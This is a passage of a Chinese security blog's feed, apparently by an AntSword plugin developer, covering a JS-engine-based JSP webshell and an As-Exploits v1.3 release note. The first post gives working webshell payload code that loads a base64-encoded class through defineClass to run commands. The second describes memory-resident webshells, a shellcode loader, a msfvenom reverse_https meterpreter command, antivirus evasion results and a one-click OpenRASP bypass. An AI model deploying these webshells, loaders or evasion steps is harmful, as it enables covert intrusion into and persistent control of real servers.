class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function test(str) &#123;</span><br><span class="line">  var bt = null;</span><br><span class="line">  var version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line"></span><br><span class="line">  if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">    var clazz = java.lang.Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">    var decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">    bt = decoder</span><br><span class="line">      .getClass()</span><br><span class="line">      .getMethod(&quot;decode&quot;, java.lang.String.class)</span><br><span class="line">      .invoke(decoder, str);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var clazz = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">    bt = clazz</span><br><span class="line">      .getMethod(&quot;decodeBuffer&quot;, java.lang.String.class)</span><br><span class="line">      .invoke(clazz.newInstance(), str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Base64DecodeToByte(str) &#123;</span><br><span class="line">  importPackage(Packages.sun.misc);</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  var bt;</span><br><span class="line">  try &#123;</span><br><span class="line">    bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    bt = Base64.getDecoder().decode(str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="保底操作">保底操作</h2><p>理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。</p><p>我们可以用java调用js后，再调用defineClass来实现：</p><p>编写一个命令执行的类：calc.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class calc &#123;</span><br><span class="line">    public calc(String cmd)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后base64一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; base64 -w 0 calc.class</span><br><span class="line">yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA</span><br></pre></td></tr></table></figure><p>填入下方payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.java.io);</span><br><span class="line">var output = new StringBuffer(&quot;&quot;);</span><br><span class="line">var cs = &quot;UTF-8&quot;;</span><br><span class="line">response.setContentType(&quot;text/html&quot;);</span><br><span class="line">request.setCharacterEncoding(cs);</span><br><span class="line">response.setCharacterEncoding(cs);</span><br><span class="line">function Base64DecodeToByte(str) &#123;</span><br><span class="line">  importPackage(Packages.sun.misc);</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  var bt;</span><br><span class="line">  try &#123;</span><br><span class="line">    bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    bt = new Base64().getDecoder().decode(str);</span><br><span class="line">  &#125;</span><br><span class="line">  return bt;</span><br><span class="line">&#125;</span><br><span class="line">function define(Classdata, cmd) &#123;</span><br><span class="line">  var classBytes = Base64DecodeToByte(Classdata);</span><br><span class="line">  var byteArray = Java.type(&quot;byte[]&quot;);</span><br><span class="line">  var int = Java.type(&quot;int&quot;);</span><br><span class="line">  var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">    &quot;defineClass&quot;,</span><br><span class="line">    byteArray.class,</span><br><span class="line">    int.class,</span><br><span class="line">    int.class</span><br><span class="line">  );</span><br><span class="line">  defineClassMethod.setAccessible(true);</span><br><span class="line">  var cc = defineClassMethod.invoke(</span><br><span class="line">    Thread.currentThread().getContextClassLoader(),</span><br><span class="line">    classBytes,</span><br><span class="line">    0,</span><br><span class="line">    classBytes.length</span><br><span class="line">  );</span><br><span class="line">  return cc.getConstructor(java.lang.String.class).newInstance(cmd);</span><br><span class="line">&#125;</span><br><span class="line">output.append(</span><br><span class="line">  define(</span><br><span class="line">    &quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;,</span><br><span class="line">    &quot;calc&quot;</span><br><span class="line">  )</span><br><span class="line">);</span><br><span class="line">response.getWriter().print(output);</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png" alt="image.png"></p><p>也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。</p><h2 id="测试">测试</h2><p>测试环境：Java&gt;=6</p><p>同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png" alt="image.png"></p><p>列目录</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png" alt="image.png"></p><p>中文测试</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png" alt="image.png"></p><p>虚拟终端</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png" alt="image.png"></p><p>数据库连接</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png" alt="image.png"></p><h2 id="最后">最后</h2><p>基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。</p><p>提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。</p><p>项目地址：</p><p><a href="https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385</a></p><h3></h3><h3 id="-2"></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;blockquote&gt;&lt;p&gt;本文首发于先知社区&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;一直以来，Java一句话木马都是采用打入字节码defineClas
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits v1.3更新</title>
    <link href="https://yzddmr6.tk/posts/as-exploits-v13-update/"/>
    <id>https://yzddmr6.tk/posts/as-exploits-v13-update/</id>
    <published>2021-05-14T12:50:00.000Z</published>
    <updated>2021-06-18T00:55:42.739Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="更新主要内容">更新主要内容</h2><h3 id="v-1-3-2021-5-14">v 1.3 (2021/5/14)</h3><ul><li><p>equals支持数组传参方式，兼容各种容器</p></li><li><p>jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式</p></li><li><p>jsp新增 Bypass OpenRASP 模块，thx@Godzilla</p></li><li><p>JarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题</p></li><li><p>reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits</p></li><li><p>冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器</p></li><li><p>各模块兼容JDK5</p></li></ul><p>挑几个重点的说说</p><h2 id="Shell入口参数支持数组形式">Shell入口参数支持数组形式</h2><p>Shell入口参数即下面new Object[]{request,response}的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]&#123;request,response&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>至于为什么要改这个玩意要从内存马的兼容说起。</p><p>除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。</p><p>于是就有跟多师傅提出了自己的解决办法，大体分为三种：</p><ol><li><p>自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。<a href="https://mp.weixin.qq.com/s/r4cU84fASjflHrp-pE-ybg" target="_blank" rel="noopener">冰蝎改造之不改动客户端=&gt;内存马</a>。</p></li><li><p>改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。<a href="https://xz.aliyun.com/t/7899" target="_blank" rel="noopener">冰蝎改造之适配基于tomcat Filter的无文件webshell</a></p></li><li><p>采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。<a href="https://xz.aliyun.com/t/8202" target="_blank" rel="noopener">使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell</a></p></li></ol><p>以上的这些方法可以是可以，但是不够优雅。</p><p>回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。</p><p>后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067954640-30c5d253-086e-4c5f-9664-d4f3d58279a9.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067965986-fd696384-0f1f-46be-a812-2fe851ad6c40.png" alt="img"></p><p>当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？</p><p>这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，<a href="https://github.com/AntSwordProject/AntSword-JSP-Template/commit/3408ec21a4361db6772f2680c7be06f4ebf22c10" target="_blank" rel="noopener">commit记录</a>可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621069223851-7c428578-4014-4856-9656-12ff9c824889.png" alt="img"></p><p>因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。</p><p>行吧，那我就再加一种情况，在JSP <a href="https://github.com/AntSwordProject/AntSword-JSP-Template/commit/ed2489f54729b30701d4894cbf01d0e7a70bb60b" target="_blank" rel="noopener">V1.4版本</a>又增加了一层反射的情况。</p><p>本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503206581-8e5bc7f0-f93f-47df-84b1-3e80206cea7a.png" alt="img"></p><p>WTF？？？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503331361-d40d72f7-ed5f-4521-a1ac-c5dd2b2df52d.png" alt="img"></p><p>然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。</p><p>所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。</p><p>现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。</p><h2 id="JarLoader模块新增手动上传方式">JarLoader模块新增手动上传方式</h2><h4 id="内存加载">内存加载</h4><p>直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067344909-cade8e67-8027-4771-8933-aeba53004124.png" alt="img"></p><h4 id="手动上传">手动上传</h4><p>先手动将Jar上传到目标服务器上，然后通过路径加载。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067350373-df952d78-4c46-4edd-8095-9a14aabfdb99.png" alt="img"></p><h2 id="JSP-ShellCode加载器">JSP ShellCode加载器</h2><p>内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。</p><p>需要注意两点：</p><ul><li>使用MSF需要加上<code>PrependMigrate=true PrependMigrateProc=xxxx.exe</code>参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：<code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888 PrependMigrate=true PrependMigrateProc=svchost.exe -f hex</code></li><li>JNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。</li></ul><h3 id="JNA方式">JNA方式</h3><p>利用第三方库JNA进行ShellCode的加载。</p><p>适用范围：JDK&gt;=1.5</p><h4 id="正确操作">正确操作</h4><ol><li><p>首先利用Jar加载器将<code>ShellCodeLoader.jar</code>上传到目标服务器目录并加载。</p></li><li><p>使用MSF或者CS生成x86类型的shellcode，并开启监听。</p></li><li><p>在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。</p></li><li><p>点击exploit，等待返回回话。</p></li></ol><h4 id="JNA方式测试">JNA方式测试</h4><p>装了360，火绒，电脑管家</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703761091-757ec1a0-dc22-42a8-8264-90186857e093.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703768557-ead0e8b9-01af-40c1-829f-859f05e3f381.png" alt="img"></p><p>上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067128068-3e3004d7-9cf1-4997-b352-c06e2cbd8d1b.png" alt="img"></p><p>手动加载到JVM中</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067132501-eb56f724-4191-4014-b940-acc602519116.png" alt="img"></p><p>MSF生成Shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067117069-28df9a49-30b4-4178-9228-51a948f0e854.png" alt="img"></p><p>选择JNA方式，exploit!</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067139961-3e021c58-560c-4283-b7d9-5379fffb27ed.png" alt="img"></p><p>直接上线，杀软没有拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067110644-490c6992-1f0e-4228-9124-1dd5dfd634d2.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067151696-a2c1fe78-b091-481f-b3d0-48fbd70893fe.png" alt="img"></p><p>关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620911946718-2055dd24-54a9-4584-b8b7-53872a35f46a.png" alt="img"></p><p>但是扫了一下发现是免杀的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912026110-a394dfa1-5fe1-46fb-923b-6aec2e55a037.png" alt="img"></p><p>VT检测结果0/68，也就是说落地也问题不大。</p><p>不过可能这篇文章出来之后就没了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912118643-c07e2e88-fb6f-415f-ac0e-952724f77c18.png" alt="img"></p><h3 id="Attach">Attach</h3><p>模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。</p><p>适用范围：JDK&gt;=1.6</p><h4 id="正确操作-2">正确操作</h4><ol><li><p>基本信息，exploit，Ctrl+F 搜索 <code>sun.arch.data.model</code>，查看java位数</p></li><li><p>根据java位数生成对应位数的shellcode，并开启监听。</p></li><li><p>在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。</p></li><li><p>点击exploit，等待返回回话。</p></li></ol><h4 id="Attach方式测试">Attach方式测试</h4><p>发现是64位java</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067200409-961948c8-5bf7-456e-95f5-fc83fdd14654.png" alt="img"></p><p>CS生成对应位数的shellcode，选择java格式导出。</p><p>粘贴到插件中，在exploit的一刻会自动格式化为hex</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703807468-151e070f-b07a-4abf-8ff2-dbad3d0a3a3d.png" alt="img"></p><p>直接上线，杀软没有拦截。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703830068-f753a8b6-57c0-4990-bc83-cd24fb7b3d75.png" alt="img"></p><h2 id="一键Bypass-OpenRASP">一键Bypass OpenRASP</h2><p>借鉴自哥斯拉的插件：<a href="https://github.com/BeichenDream/Godzilla-Plugin-Store/blob/master/Godzilla-BypassOpenRasp.jar" target="_blank" rel="noopener">Godzilla-BypassOpenRasp</a></p><p>一键绕过OpenRASP</p><p>目标安装有OpenRASP且开启命令执行拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067294376-d189243e-dd63-4feb-a291-7b384cd55aeb.png" alt="img"></p><p>exploit!</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067289062-8d172156-075b-4f43-a06a-8b30fd7f0bef.png" alt="img"></p><p>再次运行，即可执行命令</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067283390-eeef6d4e-f632-40d0-ad5a-fbb717044e06.png" alt="img"></p><h2 id="其他">其他</h2><ul><li><p>reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits</p></li><li><p>冰蝎内存马去除pageContext依赖，兼容Spring等容器</p></li><li><p>各模块兼容JDK5</p></li></ul><h2 id="项目地址">项目地址</h2><p><a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p><p>来颗star吧~</p>]]></content>
    
    <summary type="html">
    
      As-Exploits v1.3更新
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ClassLoader的理解</title>
    <link href="https://yzddmr6.tk/posts/ClassLoader%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://yzddmr6.tk/posts/ClassLoader的理解/</id>
    <published>2021-04-30T01:55:00.000Z</published>
    <updated>2021-06-20T01:57:45.581Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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